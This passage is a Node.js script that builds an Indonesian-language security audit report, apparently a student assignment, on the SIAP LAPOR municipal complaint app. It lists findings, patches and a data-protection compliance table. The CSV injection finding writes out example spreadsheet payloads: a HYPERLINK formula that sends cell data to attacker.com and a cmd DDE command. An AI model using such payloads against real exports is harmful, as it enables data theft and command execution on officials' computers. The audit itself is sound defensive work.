    heading2('Temuan 3: SEC-VULN-03 [HIGH] Paparan Data Pribadi (PII Plaintext) & Pelanggaran UU PDP No. 27/2022'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi', 30, { bold: true }),
            tdCell('CWE-312: Cleartext Storage of Sensitive Information / OWASP A02:2021 – Cryptographic Failures', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Skor & Vektor CVSS v3.1', 30, { bold: true }),
            tdCell('7.5 (HIGH) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 70, { bold: true, color: 'C2410C' }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File / Komponen Terdampak', 30, { bold: true }),
            tdCell('database/schema.sql (baris 19-32 & 52-75), src/components/pages/CitizenReportForm.tsx', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Bukti Kode Skema Database (database/schema.sql):', bold: true, color: C.textDark }
    ]),
    ...codeBlock([
      'CREATE TABLE users (',
      '    nik VARCHAR(16) UNIQUE,         -- PII Sensitif: Disimpan dalam bentuk plaintext!',
      '    phone_number VARCHAR(20) NOT NULL, -- PII: Disimpan tanpa enkripsi kolom',
      '    email VARCHAR(150) UNIQUE NOT NULL',
      ');',
      'CREATE TABLE reports (',
      '    reporter_id UUID REFERENCES users(id),',
      '    reporter_display_phone VARCHAR(25) NOT NULL, -- Nomor kontak disimpan terbuka',
      '    address_display TEXT NOT NULL',
      ');'
    ]),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Dampak Regulasi & Hukum: ', bold: true, color: C.danger },
      { text: 'Berdasarkan UU No. 27 Tahun 2022 Pasal 67 ayat (2), setiap orang yang sengaja dan melawan hukum mengungkapkan data pribadi yang bukan miliknya dapat dipidana. Menyimpan NIK 16 digit dalam format plaintext di database publik melanggar standar pengamanan data SPBE.' }
    ], { spaceAfter: 80 }),
    paraMulti([
      { text: 'Rekomendasi Remediasi Defensif: ', bold: true, color: C.success },
      { text: 'Gunakan modul enkripsi kolom PostgreSQL (pgcrypto) seperti pgp_sym_encrypt() untuk kolom NIK dan nomor kontak. Terapkan masking data (contoh: "1871********0001" dan "0812-****-1234") pada seluruh lapisan API dan presentation layer.' }
    ], { spaceAfter: 160 })
  );

  // TEMUAN 4
  sections.push(
    heading2('Temuan 4: SEC-VULN-04 [HIGH] CSV / Formula Injection pada Fitur Ekspor Rekapitulasi Laporan'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi', 30, { bold: true }),
            tdCell('CWE-1236: Improper Neutralization of Formula Elements in CSV / OWASP A03:2021 – Injection', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Skor & Vektor CVSS v3.1', 30, { bold: true }),
            tdCell('7.7 (HIGH) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N', 70, { bold: true, color: 'C2410C' }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File / Komponen Terdampak', 30, { bold: true }),
            tdCell('src/components/pages/AdminDashboard.tsx (baris 27-38)', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Bukti Kode Sumber (src/components/pages/AdminDashboard.tsx):', bold: true, color: C.textDark }
    ]),
    ...codeBlock([
      'const handleExportCSV = () => {',
      '  const csvContent = "data:text/csv;charset=utf-8,"',
      '    + "Nomor Tiket,Kategori,Judul,Kecamatan,Sisa SLA,Status,Pelapor,Waktu Masuk\\n"',
      '    + reports.map(r => `${r.id},"${r.categoryName}","${r.title.replace(/"/g, \'""\')}","${r.district}",` +',
      '      `"${r.slaRemaining}",${r.status},"${r.reporterName}","${r.createdAt}"`).join("\\n");',
      '  // CSV diunduh langsung tanpa sanitasi karakter awalan rumus (=, +, -, @, cmd)',
      '};'
    ]),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Dampak Kerentanan: ', bold: true, color: C.danger },
      { text: 'Jika masyarakat memasukkan judul aduan diawali dengan rumus formula spreadsheet (misalnya: =HYPERLINK("http://attacker.com/leak?data="&A1; "Klik") atau =cmd|\'/C calc\'!A0), aplikasi spreadsheet di komputer admin Pemkot (Excel/Calc) akan mengeksekusi payload tersebut saat file dibuka, berujung pada eksfiltrasi data atau eksekusi perintah sistem.' }
    ], { spaceAfter: 80 }),
    paraMulti([
      { text: 'Rekomendasi Remediasi Defensif: ', bold: true, color: C.success },
      { text: 'Lakukan sanitasi ketat terhadap seluruh sel data string yang akan dimasukkan ke dalam CSV. Jika string diawali dengan karakter =, +, -, @, atau tab, tambahkan tanda petik tunggal (\') di depannya sehingga aplikasi spreadsheet memperlakukannya sebagai teks murni.' }
    ], { spaceAfter: 160 })
  );

  // TEMUAN 5
  sections.push(
    heading2('Temuan 5: SEC-VULN-05 [HIGH] Manipulasi Metadata Foto & Ketiadaan Verifikasi EXIF Server-Side'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi', 30, { bold: true }),
            tdCell('CWE-345: Insufficient Verification of Data Authenticity / OWASP A08:2021 – Software and Data Integrity Failures', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Skor & Vektor CVSS v3.1', 30, { bold: true }),
            tdCell('7.4 (HIGH) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N', 70, { bold: true, color: 'C2410C' }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File / Komponen Terdampak', 30, { bold: true }),
            tdCell('src/context/AppContext.tsx (baris 119-125), src/components/pages/CitizenReportForm.tsx', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Bukti Kode Sumber (src/context/AppContext.tsx):', bold: true, color: C.textDark }
    ]),
    ...codeBlock([
      'exifData: {',
      '  camera: "Kamera Smartphone (EXIF Verified)",',
      '  dateTime: new Date().toLocaleString("id-ID"),',
      '  lat: -5.3824,',
      '  lng: 105.2578,',
      '  isAntiHoaxValid: true // Klien menyetel sendiri nilai validasi anti-hoaks!',
      '}'
    ]),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Dampak Kerentanan: ', bold: true, color: C.danger },
      { text: 'Masyarakat atau oknum yang tidak bertanggung jawab dapat mengunggah foto jalan rusak dari internet atau kota lain, kemudian menyetel lokasi GPS buatan seolah-olah terjadi di Bandar Lampung. Admin verifikasi dapat tertipu oleh indikator hijau "Anti-Hoax Valid" palsu.' }
    ], { spaceAfter: 80 }),
    paraMulti([
      { text: 'Rekomendasi Remediasi Defensif: ', bold: true, color: C.success },
      { text: 'Verifikasi EXIF wajib dipindahkan ke backend server menggunakan library parsing biner murni (misal: exif-parser / sharp). Bandingkan selisih jarak antara titik GPS koordinat kamera dengan GPS lokasi aduan (haversine formula; threshold maksimal 50 meter) dan lakukan pengecekan reverse image search hash.' }
    ], { spaceAfter: 160 })
  );

  // TEMUAN 6
  sections.push(
    heading2('Temuan 6: SEC-VULN-06 [MEDIUM] Ketiadaan Row Level Security (RLS) pada Database PostgreSQL'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi', 30, { bold: true }),
            tdCell('CWE-284: Improper Access Control / OWASP A01:2021 – Broken Access Control (Database Layer)', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Skor & Vektor CVSS v3.1', 30, { bold: true }),
            tdCell('6.5 (MEDIUM) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', 70, { bold: true, color: C.warning }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File / Komponen Terdampak', 30, { bold: true }),
            tdCell('database/schema.sql (seluruh tabel entitas: users, reports, assignments, work_updates)', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 80 }),
    para(
      'Deskripsi Analisis: Pada skema database PostgreSQL (database/schema.sql), tidak ditemukan satu pun ' +
      'perintah penegakan Row Level Security (ALTER TABLE ... ENABLE ROW LEVEL SECURITY). ' +
      'Jika backend menggunakan role database umum (misal: postgres atau service_role), ' +
      'kesalahan query sederhana atau penyusupan API akan memungkinkan user membaca record milik warga lain.',
      { spaceAfter: 80 }
    ),
    paraMulti([
      { text: 'Rekomendasi Remediasi Defensif: ', bold: true, color: C.success },
      { text: 'Aktifkan PostgreSQL RLS pada tabel reports, assignments, dan users. Buat kebijakan (policy) eksplisit: Warga hanya boleh membaca baris laporan yang kolom reporter_id cocok dengan JWT auth.uid(); Petugas hanya membaca laporan yang ditugaskan kepada NIP-nya; Admin memiliki hak penuh.' }
    ], { spaceAfter: 160 })
  );

  // TEMUAN 7
  sections.push(
    heading2('Temuan 7: SEC-VULN-07 [MEDIUM] Pseudo-Audit Trail Menggunakan Pseudorandom Non-Kriptografis'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi', 30, { bold: true }),
            tdCell('CWE-353: Missing Support for Integrity Check / OWASP A09:2021 – Security Logging and Monitoring Failures', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Skor & Vektor CVSS v3.1', 30, { bold: true }),
            tdCell('6.1 (MEDIUM) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N', 70, { bold: true, color: C.warning }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File / Komponen Terdampak', 30, { bold: true }),
            tdCell('src/context/AppContext.tsx (baris 146 & 185)', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Bukti Kode Sumber (src/context/AppContext.tsx):', bold: true, color: C.textDark }
    ]),
    ...codeBlock([
      'const newLog: AuditLog = {',
      '  id: `log-${Date.now()}`,',
      '  timestamp: new Date().toLocaleTimeString("id-ID") + " WIB",',
      '  event: `Laporan baru #${newId} dibuat (${newReport.categoryName})`,',
      '  actor: "Warga Terverifikasi NIK",',
      '  source: "Frontend Gateway",',
      '  hashSha256: Math.random().toString(16).substring(2, 66) // BUKAN SHA-256 asli! Hanya random string',
      '};'
    ]),
    para('', { spaceAfter: 80 }),
    paraMulti([
      { text: 'Dampak Kerentanan: ', bold: true, color: C.warning },
      { text: 'Hash log yang dihasilkan secara acak tidak memiliki keterkaitan matematis dengan data kejadian (timestamp, actor, event). Jika terjadi perselisihan hukum atau tuduhan manipulasi oleh petugas, log tersebut tidak memiliki kekuatan pembuktian digital forensik (non-repudiation).' }
    ], { spaceAfter: 80 }),
    paraMulti([
      { text: 'Rekomendasi Remediasi Defensif: ', bold: true, color: C.success },
      { text: 'Terapkan kriptografi rantai blok (hash chain ledger) berbasis HMAC-SHA256: HashLog_N = SHA256(HashLog_{N-1} + Timestamp + ActorID + EventPayload + SecretKey). Simpan audit log pada database yang mengaktifkan hak akses append-only (tidak dapat diubah atau dihapus oleh siapapun).' }
    ], { spaceAfter: 160 })
  );

  // TEMUAN 8, 9, 10
  sections.push(
    heading2('Temuan 8: SEC-VULN-08 [MEDIUM] Ketiadaan HTTP Security Headers pada Vercel Deployment'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Atribut Kerentanan', 30),
            thCell('Detail Analisis', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Klasifikasi & Skor', 30, { bold: true }),
            tdCell('CWE-693 / OWASP A05:2021 – Security Misconfiguration | CVSS 5.8 (MEDIUM)', 70, { bold: true, color: C.warning }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('File Terdampak', 30, { bold: true }),
            tdCell('vercel.json, index.html', 70),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Uraian Kerentanan', 30, { bold: true }),
            tdCell('Konfigurasi vercel.json tidak mendefinisikan header keamanan wajib seperti Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), X-Frame-Options (DENY), dan X-Content-Type-Options (nosniff), membuka risiko Clickjacking dan MIME-sniffing.', 70),
          ]
        }),
      ]
    }),
    para('', { spaceAfter: 120 }),

    heading2('Temuan 9: SEC-VULN-09 [LOW] Unbounded LocalStorage State & Risiko Browser Denial of Service'),
    para(
      'Analisis: Aplikasi menyimpan seluruh array objek reports (termasuk foto bukti beresolusi tinggi dalam format base64) ' +
      'langsung ke dalam window.localStorage tanpa batasan kuota. LocalStorage browser dibatasi umumnya hanya 5 MB. ' +
      'Setelah pengguna membuat 3-4 laporan dengan foto berkualitas tinggi, pemanggilan JSON.stringify() ' +
      'akan melemparkan eksepsi DOMException QUOTA_EXCEEDED_ERR dan membuat UI membeku (client-side DoS).',
      { spaceAfter: 80 }
    ),
    paraMulti([
      { text: 'Rekomendasi: ', bold: true, color: C.success },
      { text: 'Foto bukti tidak boleh disimpan di localStorage. Unggah file langsung ke Object Storage (S3/Cloudflare R2) dan simpan hanya URL referensi yang sudah ditandatangani (presigned URL).' }
    ], { spaceAfter: 120 }),

    heading2('Temuan 10: SEC-VULN-10 [INFORMATIONAL] Ketiadaan Rate Limiting pada Pengajuan Aduan'),
    para(
      'Analisis: Endpoint formulir aduan publik belum dilengkapi proteksi anti-spam (seperti Cloudflare Turnstile atau reCAPTCHA v3) ' +
      'serta rate limiting berbasis IP/subnet. Skrip otomatis dapat membanjiri antrean verifikator Diskominfo dengan ribuan tiket palsu.',
      { spaceAfter: 80 }
    ),
    paraMulti([
      { text: 'Rekomendasi: ', bold: true, color: C.success },
      { text: 'Terapkan rate limiting ketat pada API gateway (maksimal 5 aduan per jam per IP atau per NIK) serta integrasikan widget verifikasi anti-bot ringan.' }
    ], { spaceAfter: 160 })
  );

  sections.push(new Paragraph({ children: [new PageBreak()] }));
  return sections;
}

// ─── BAB IV: BLUEPRINT REMEDIASI DEFENSIP ─────────────────────────────────────
function buildBab4_BlueprintRemediasi() {
  return [
    heading1('BAB IV: BLUEPRINT REMEDIASI DEFENSIP & KODE IMPLEMENTASI'),

    heading2('4.1 Roadmap & Prioritas Tindakan Mitigasi'),
    para(
      'Untuk mentransformasi prototipe SIAP LAPOR menjadi sistem SPBE kelas produksi yang tangguh, ' +
      'tim pengembang wajib mengeksekusi blueprint pertahanan berlapis (defense-in-depth) ' +
      'berdasarkan 3 tahapan prioritas mitigasi:',
      { spaceAfter: 100 }
    ),

    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Fase Tindakan', 20),
            thCell('Rentang Waktu', 20),
            thCell('Target Mitigasi Kerentanan', 60),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Fase 1: Hotfix Kritis', 20, { bold: true, color: C.danger }),
            tdCell('1 - 3 Hari Kerja', 20, { center: true }),
            tdCell('Sanitasi CSV Formula Injection, isolasi RoleSwitcher dari production build, dan penutupan pencarian substring tiket pada TrackTicketModal.', 60),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Fase 2: Arsitektur Backend', 20, { bold: true, color: 'C2410C' }),
            tdCell('1 - 2 Minggu', 20, { center: true }),
            tdCell('Implementasi Autentikasi JWT Server-side via HttpOnly Cookies, migrasi verifikasi EXIF foto ke backend, dan pembatasan rate limiting.', 60),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Fase 3: Database & Infra', 20, { bold: true, color: C.secondary }),
            tdCell('2 - 3 Minggu', 20, { center: true }),
            tdCell('Penerapan PostgreSQL Row Level Security (RLS), enkripsi kolom PII dengan pgcrypto, audit logging HMAC-SHA256, dan konfigurasi CSP pada Vercel.', 60),
          ]
        }),
      ]
    }),

    para('', { spaceAfter: 140 }),

    heading2('4.2 Patch Keamanan Database: PostgreSQL RLS & Enkripsi PII Kolom'),
    para(
      'Berikut adalah skrip perbaikan database/schema.sql yang siap dieksekusi untuk mengenkripsi ' +
      'NIK serta menegakkan aturan hak akses di level basis data:',
      { spaceAfter: 80 }
    ),
    ...codeBlock([
      '-- 1. AKTIFKAN EXTENSION ENKRIPSI PGCRYPTO',
      'CREATE EXTENSION IF NOT EXISTS "pgcrypto";',
      '',
      '-- 2. ENKRIPSI KOLOM PII DENGAN KUNCI SIMETRIS SERVER (AES-256)',
      'ALTER TABLE users ADD COLUMN nik_encrypted BYTEA;',
      '-- Simpan data terenkripsi: pgp_sym_encrypt(NEW.nik, current_setting(\'app.jwt_secret\'))',
      '',
      '-- 3. AKTIFKAN ROW LEVEL SECURITY (RLS) PADA TABEL REPORTS',
      'ALTER TABLE reports ENABLE ROW LEVEL SECURITY;',
      '',
      '-- KEBIJAKAN 1: Warga hanya bisa melihat aduan miliknya sendiri',
      'CREATE POLICY citizen_view_own_reports ON reports',
      '    FOR SELECT',
      '    USING (auth.uid() = reporter_id OR is_anonymous = false);',
      '',
      '-- KEBIJAKAN 2: Petugas hanya dapat membaca laporan yang ditugaskan dalam SPT',
      'CREATE POLICY officer_view_assigned_reports ON reports',
      '    FOR SELECT',
      '    USING (EXISTS (',
      '        SELECT 1 FROM assignments WHERE assignments.report_id = reports.id',
      '        AND assignments.officer_id = auth.uid()',
      '    ));',
      '',
      '-- KEBIJAKAN 3: Admin Command Center memiliki hak akses penuh',
      'CREATE POLICY admin_full_access ON reports',
      '    FOR ALL',
      '    USING (auth.jwt_role() = \'ADMIN\');'
    ]),

    para('', { spaceAfter: 120 }),

    heading2('4.3 Patch Sanitasi CSV Formula Injection (TypeScript)'),
    para(
      'Fungsi sanitasi berikut wajib membungkus seluruh field data string sebelum dikompilasi ke dalam berkas CSV:',
      { spaceAfter: 80 }
    ),
    ...codeBlock([
      '// File: src/utils/csvSanitizer.ts',
      'export function sanitizeForCSV(field: string | number | undefined | null): string {',
      '  if (field === undefined || field === null) return \'""\';',
      '  let value = String(field).trim();',
      '  // Periksa apakah diawali dengan karakter pemicu formula Excel/Calc',
      '  const dangerousChars = [\'=\', \'+\', \'-\', \'@\', \'\\t\', \'\\r\'];',
      '  if (dangerousChars.some(ch => value.startsWith(ch))) {',
      '    value = `\'${value}`; // Netralisir dengan tanda petik tunggal di awal',
      '  }',
      '  // Escape petik ganda untuk format RFC-4180',
      '  return `"${value.replace(/"/g, \'""\')}"`;',
      '}'
    ]),

    para('', { spaceAfter: 120 }),

    heading2('4.4 Patch Hardening HTTP Security Headers pada vercel.json'),
    para(
      'Konfigurasi vercel.json yang diperkuat untuk mencegah serangan Clickjacking, XSS, dan sniffing:',
      { spaceAfter: 80 }
    ),
    ...codeBlock([
      '{',
      '  "headers": [',
      '    {',
      '      "source": "/(.*)",',
      '      "headers": [',
      '        { "key": "X-Frame-Options", "value": "DENY" },',
      '        { "key": "X-Content-Type-Options", "value": "nosniff" },',
      '        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },',
      '        { "key": "Strict-Transport-Security", "value": "max-age=31536000; includeSubDomains; preload" },',
      '        { "key": "Content-Security-Policy", "value": "default-src \'self\'; img-src \'self\' https://images.unsplash.com data:; style-src \'self\' \'unsafe-inline\' https://fonts.googleapis.com; font-src \'self\' https://fonts.gstatic.com;" }',
      '      ]',
      '    }',
      '  ]',
      '}'
    ]),

    new Paragraph({ children: [new PageBreak()] })
  ];
}

// ─── BAB V: MATRIKS KEPATUHAN REGULASI ─────────────────────────────────────────
function buildBab5_MatriksKepatuhanRegulasi() {
  return [
    heading1('BAB V: MATRIKS KEPATUHAN REGULASI & STANDAR INDUSTRI'),

    heading2('5.1 Evaluasi Kepatuhan UU No. 27 Tahun 2022 (UU PDP)'),
    para(
      'Berdasarkan Undang-Undang Pelindungan Data Pribadi, penyelenggara platform publik ' +
      'diklasifikasikan sebagai Pengendali Data Pribadi yang memiliki kewajiban hukum mengamankan data warga.',
      { spaceAfter: 100 }
    ),

    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Pasal UU PDP', 20),
            thCell('Prinsip Kewajiban', 30),
            thCell('Status Evaluasi SIAP LAPOR', 25),
            thCell('Catatan & Tindakan Wajib', 25),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Pasal 16 ayat (2)', 20, { bold: true }),
            tdCell('Pengendali wajib memastikan akurasi dan kerahasiaan data pribadi.', 30),
            tdCell('BELUM PATUH', 25, { bold: true, color: C.danger, center: true }),
            tdCell('NIK dan nomor telepon masih disimpan dalam bentuk teks terbuka.', 25),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Pasal 35', 20, { bold: true }),
            tdCell('Kewajiban melindungi data dari akses tidak sah dengan enkripsi teknis.', 30),
            tdCell('PATUH SEBAGIAN', 25, { bold: true, color: C.warning, center: true }),
            tdCell('Password telah di-hash Argon2, namun kolom NIK belum terenkripsi.', 25),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Pasal 39', 20, { bold: true }),
            tdCell('Kewajiban mencatat seluruh aktivitas pemrosesan data (audit trail).', 30),
            tdCell('PATUH SEBAGIAN', 25, { bold: true, color: C.warning, center: true }),
            tdCell('Tabel log tersedia, namun hash SHA-256 masih berupa string acak dummy.', 25),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Pasal 47', 20, { bold: true }),
            tdCell('Hak subjek data untuk meminta penghapusan atau koreksi data pribadi.', 30),
            tdCell('BELUM TERSEDIA', 25, { bold: true, color: C.danger, center: true }),
            tdCell('Belum ada modul penghapusan akun atau hak lupa (right to erasure).', 25),
          ]
        }),
      ]
    }),

    para('', { spaceAfter: 140 }),

    heading2('5.2 Evaluasi Terhadap Standar Keamanan SPBE & BSSN'),
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            thCell('Domain Keamanan SPBE', 30),
            thCell('Kriteria Standar BSSN', 45),
            thCell('Tingkat Kesiapan', 25),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Manajemen Akses & Identitas', 30, { bold: true }),
            tdCell('Autentikasi multifaktor (MFA) bagi aparatur OPD dan otorisasi berbasis peran (RBAC) di sisi server.', 45),
            tdCell('Tingkat 2 (Perlu Penguatan)', 25, { center: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Keamanan Aplikasi Web', 30, { bold: true }),
            tdCell('Bebas dari kerentanan OWASP Top 10, sanitasi input lengkap, dan implementasi security headers.', 45),
            tdCell('Tingkat 2 (Perlu Remediasi)', 25, { center: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Kerahasiaan & Kriptografi', 30, { bold: true }),
            tdCell('Enkripsi transit (TLS 1.3) dan enkripsi istirahat (AES-256) pada pangkalan data kependudukan.', 45),
            tdCell('Tingkat 3 (Memadai Sebagian)', 25, { center: true }),
          ]
        }),
        new TableRow({
          children: [
            tdCell('Audit Trail & Forensik', 30, { bold: true }),
            tdCell('Log kegiatan tersimpan tidak dapat diubah (tamper-proof) dengan penanda waktu tersinkronisasi NTP.', 45),
            tdCell('Tingkat 2 (Perlu Peningkatan)', 25, { center: true }),
          ]
        }),
      ]
    }),

    new Paragraph({ children: [new PageBreak()] })
  ];
}

// ─── BAB VI: KESIMPULAN & LEMBAR PENGESAHAN ───────────────────────────────────
function buildBab6_KesimpulanRekomendasi() {
  return [
    heading1('BAB VI: KESIMPULAN & REKOMENDASI FORMAL'),

    heading2('6.1 Kesimpulan Hasil Audit Keamanan'),
    para(
      'Berdasarkan audit keamanan komprehensif yang telah dilakukan terhadap kode sumber, ' +
      'arsitektur state, dan skema database platform SIAP LAPOR Kota Bandar Lampung v1.4.0, ' +
      'dapat disimpulkan bahwa:',
      { spaceAfter: 100 }
    ),
    bullet('SIAP LAPOR berhasil mengimplementasikan antarmuka modern yang responsif dan alur bisnis aduan publik yang sangat baik (mulai dari pengajuan, verifikasi Diskominfo, penugasan SPT, hingga tracking tiket).', 0, false),
    bullet('Secara postur keamanan siber, aplikasi masih berada pada tahap pengujian UI/prototipe dan belum siap dirilis ke jaringan publik karena masih mempercayai manipulasi state di sisi klien (client-side trust model).', 0, false),
    bullet('Ditemukan 1 kerentanan Critical (Broken Access Control) dan 4 kerentanan High (IDOR, PII Plaintext, CSV Injection, dan Spoofing EXIF) yang wajib ditangani sebelum integrasi dengan sistem riil Pemkot Bandar Lampung.', 0, false),
    bullet('Penerapan blueprint remediasi pada Bab IV (termasuk implementasi PostgreSQL RLS, sanitasi CSV RFC-4180, dan enkripsi NIK pgcrypto) akan meningkatkan skor postur keamanan sistem dari status Rawan ke status Tangguh (Enterprise-Ready).', 0, false),

    para('', { spaceAfter: 140 }),

    heading2('6.2 Pernyataan Tindak Lanjut Akademik & Teknis'),
    para(
      'Laporan audit ini disusun sebagai wujud pertanggungjawaban ilmiah dan rekayasa perangkat lunak ' +
      'berkualitas tinggi dalam kerangka kolaborasi akademik Universitas Teknokrat Indonesia (UTI) ' +
      'dengan Pemerintah Kota Bandar Lampung.',
      { spaceAfter: 180 }
    ),

    // Lembar Tanda Tangan Formal
    new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      borders: cellBorder(C.borderGray, 4),
      rows: [
        new TableRow({
          children: [
            new TableCell({
              columnSpan: 2,
              shading: { type: ShadingType.SOLID, fill: C.primary },
              borders: cellBorder(C.primary, 4),
              children: [
                new Paragraph({
                  alignment: AlignmentType.CENTER,
                  spacing: { before: 80, after: 80 },
                  children: [
                    new TextRun({
                      text: 'LEMBAR PENGESAHAN HASIL AUDIT KEAMANAN SISTEM',
                      bold: true, size: 21, color: C.white, font: 'Calibri'
                    })
                  ]
                })
              ]
            })
          ]
        }),
        new TableRow({
          children: [
            new TableCell({
              shading: { type: ShadingType.SOLID, fill: C.white },
              borders: cellBorder(C.borderGray, 4),
              children: [
                para('Bandar Lampung, 10 November 2026', { alignment: AlignmentType.CENTER, spaceAfter: 40 }),
                para('Penguji / Auditor Keamanan,', { alignment: AlignmentType.CENTER, spaceAfter: 200 }),
                para('_________________________________', { alignment: AlignmentType.CENTER, spaceAfter: 40 }),
                para('RAYHAN PRATAMA', { bold: true, alignment: AlignmentType.CENTER, spaceAfter: 20 }),
                para('NPM: 23311140 | Kelas: SI23DX', { alignment: AlignmentType.CENTER, spaceAfter: 20 }),
                para('Universitas Teknokrat Indonesia', { alignment: AlignmentType.CENTER, spaceAfter: 60 }),
              ]
            }),
            new TableCell({
              shading: { type: ShadingType.SOLID, fill: C.white },
              borders: cellBorder(C.borderGray, 4),
              children: [
                para('Mengetahui dan Menyetujui,', { alignment: AlignmentType.CENTER, spaceAfter: 40 }),
                para('Dosen Pengampu Mata Kuliah,', { alignment: AlignmentType.CENTER, spaceAfter: 200 }),
                para('_________________________________', { alignment: AlignmentType.CENTER, spaceAfter: 40 }),
                para('Dr. ERLIYAN REDY SUSANTO, M.Kom.', { bold: true, alignment: AlignmentType.CENTER, spaceAfter: 20 }),
                para('Dosen Pembimbing Akademik', { alignment: AlignmentType.CENTER, spaceAfter: 20 }),
                para('Universitas Teknokrat Indonesia', { alignment: AlignmentType.CENTER, spaceAfter: 60 }),
              ]
            }),
          ]
        })
      ]
    }),

    para('', { spaceAfter: 200 }),
    para('Lampiran Tambahan & Referensi Teknis terlampir pada dokumen pendukung di dalam repositori sistem.', { italic: true, size: 18, color: C.textMuted, alignment: AlignmentType.CENTER })
  ];
}

// ─── MAIN GENERATOR ───────────────────────────────────────────────────────────
async function main() {
  console.log('🛡️  Menyusun berkas Laporan Audit Keamanan SIAP LAPOR (.docx)...');

  const doc = new Document({
    creator: 'Rayhan Pratama (23311140) – SIAP LAPOR v1.4',
    title: 'Laporan Audit Keamanan SIAP LAPOR Kota Bandar Lampung',
    description: 'Security Audit, Vulnerability Assessment, Threat Modeling STRIDE & Blueprint Remediasi',
    styles: {
      default: {
        document: {
          run: { font: 'Calibri', size: 21, color: C.textMid },
        },
      },
    },
    sections: [
      {
        properties: {
          page: {
            margin: {
              top:    convertInchesToTwip(1.0),
              bottom: convertInchesToTwip(1.0),
              left:   convertInchesToTwip(1.0),
              right:  convertInchesToTwip(1.0),
            },
          },
        },
        headers: {
          default: new Header({
            children: [
              new Paragraph({
                alignment: AlignmentType.RIGHT,
                border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: C.borderGray } },
                spacing: { after: 80 },
                children: [
                  new TextRun({
                    text: 'LAPORAN AUDIT KEAMANAN — SIAP LAPOR v1.4  |  Rayhan Pratama (23311140)',
                    size: 18, color: C.textMuted, font: 'Calibri'
                  }),
                ],
              }),
            ],
          }),
        },
        footers: {
          default: new Footer({
            children: [
              new Paragraph({
                alignment: AlignmentType.CENTER,
                border: { top: { style: BorderStyle.SINGLE, size: 4, color: C.borderGray } },
                spacing: { before: 80 },
                children: [
                  new TextRun({
